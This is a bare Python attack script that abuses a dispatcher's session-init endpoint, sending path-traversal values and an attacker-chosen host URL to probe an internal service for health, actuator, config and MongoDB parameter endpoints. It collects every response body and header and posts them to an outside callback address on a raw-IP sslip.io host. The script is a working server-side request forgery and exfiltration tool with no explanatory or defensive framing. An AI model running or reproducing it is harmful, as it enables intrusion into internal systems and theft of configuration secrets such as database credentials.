#!/usr/bin/env python3
import json,os,time,urllib.request,urllib.error
base=os.environ.get('BUILDMODE_DISPATCHER_URL','http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local')
host='http://lrs-metaserve-01.canv2-sl-app-launcher.svc.cluster.local'
paths=['/','/health','/ready','/version','/metrics','/openapi.json','/docs','/swagger.json','/api','/api/','/get_param','/get_param?param_key=MONGODB','/params','/params/MONGODB','/parameter/MONGODB','/get_param/MONGODB','/debug','/routes','/actuator','/actuator/health','/actuator/env','/config','/config/MONGODB','/v1/params','/v1/get_param']
out={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'base':base,'host':host,'cases':[]}
for i,p in enumerate(paths):
 uid=f'snapgpt-msrf-{i}@armorerlabs.com'
 body=json.dumps({'user_id':uid,'host_url':host,'project_path':'../../../../'+p,'force':True},separators=(',',':')).encode()
 req=urllib.request.Request(base+'/session/init',data=body,method='POST',headers={'Content-Type':'application/json','X-SL-Token':'x'})
 rec={'path':p,'user_id':uid}; t=time.monotonic()
 try:
  with urllib.request.urlopen(req,timeout=20) as r: rec.update(status=r.status,headers=dict(r.headers),body=r.read(20000).decode('utf-8','replace'))
 except urllib.error.HTTPError as e: rec.update(status=e.code,headers=dict(e.headers),body=e.read(20000).decode('utf-8','replace'))
 except Exception as e: rec['error']=repr(e)
 rec['elapsed']=round(time.monotonic()-t,3); out['cases'].append(rec); print(json.dumps(rec,separators=(',',':')))
raw=json.dumps(out,separators=(',',':')).encode(); req=urllib.request.Request('https://54.209.51.244.sslip.io/callback/snapgpt-metaserve-ssrf-surface-20261106',data=raw,method='POST',headers={'Content-Type':'application/json'})
try:
 with urllib.request.urlopen(req,timeout=30) as r: print('SINK',r.status,len(raw))
except Exception as e: print('SINKERR',repr(e),len(raw))
